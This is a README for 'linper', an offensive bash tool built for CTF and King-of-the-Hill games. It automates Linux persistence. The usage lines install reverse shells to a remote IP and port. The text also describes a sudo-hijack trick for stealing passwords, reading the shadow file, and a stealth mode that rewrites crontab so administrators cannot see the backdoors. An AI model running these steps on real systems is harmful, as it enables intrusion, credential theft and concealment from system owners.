# linper

Automated Linux Persistence Establishment

Automatically install multiple methods of persistence, or just enumerate possible methods.

## advisory

This was developed with CTFs in mind and that is its intended use case. The stealth-mode option is for King of the Hill style competitions where others might try and tamper with your persistence. Please do not use this tool in an unethical or illegal manner.

## files

- README.md - or not
- TODO.md - planned fixes & enhancements
- linper.sh - execute me
- gtfobins/ - directory containing (possibly modified) snippets of code from [gtfobins](https://gtfobins.github.io/) as I am working on integrating them into the overall script

## usage

Enumerate all persistence methods and install

`bash linper.sh --rhost 10.10.10.10 --rport 4444`

`bash linper.sh -i 10.10.10.10 -p 4444`

Enumerate and do not install

`bash linper.sh --dryrun`

`bash linper.sh -d`

Enumerate all persistence methods and install (stealth mode)

`bash linper.sh --rhost 10.10.10.10 --rport 4444 --stealth-mode`

`bash linper.sh -i 10.10.10.10 -p 4444 -s`

## methodology

1. Enumerating methods and doors - the script enumerates binaries that can be used for executing a reverse shell (methods, e.g. bash), and then for each of those, it enumerates ways to make them persist (doors, e.g. crontab). If dryrun is not set, every possible method and door pair is set

2. Sudo hijack attack - Enumerates whether or not the current user can sudo, if so, and if dryrun not set, it installs a function in their bashrc to "hijack that binary". Thanks to [this Null Byte article](https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/) for the idea.

3. Web Server Poison Attack - Enumerates whether or not the webserver's directories are writable (this feature will be expanded, see TODO.md)

4. Shadow file enumeration - Enumerates whether or not the shadow file is readable, if dryrun is not set then it will grep for non-system accounts

## stealth mode

`-s, --stealth-mode various trivial modifications in an attempt to hide the backdoors from humans`

1. Makes the files related to installing services hidden by prepending a "."

2. Disables the ability to append methods to the bashrc - because if a connection fails it is noisy and prints to the screen

3. Creates a `crontab` function in \~/.bash\_aliases to override the `-r` and `-l` flags. `-r` is changed to remove all crontab entries <u>except</u> your reverse shells. `-l` is changed to list all the existing cron jobs <u>except</u> your reverse shells.

### known limitation

1. If you run `--stealth-mode` as a sudo enabled user, be aware that you can bypass the `crontab` function installed in \~/.bash\_aliases because aliases are not preserved when running `sudo`, nor does `sudo` call the `root` user aliases. (This does not interfere with the sudo hijack attack)
